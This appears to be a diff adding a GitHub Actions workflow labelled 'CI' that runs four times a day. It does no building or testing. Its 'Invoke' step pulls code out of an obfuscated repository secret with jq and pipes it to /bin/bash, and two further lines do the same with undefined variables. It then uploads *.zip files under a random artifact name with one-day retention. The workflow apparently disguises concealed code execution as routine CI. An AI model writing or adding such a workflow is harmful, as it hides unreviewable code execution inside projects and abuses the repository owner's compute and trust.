@@ -1,0 +1,30 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '36 2,8,14,20 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          syd12490: ${{ secrets.syd12490 }}
+        run: |
+          printf '%s' "$syd12490" | jq -r .cqk833 | /bin/bash
+          printf '%s' "$ha39" | jq -r .yn17 | /bin/bash
+          printf '%s' "$gxku55169" | jq -r .mfrfe93460 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: eJBwuxwM
+          path: "*.zip"
+          retention-days: 1
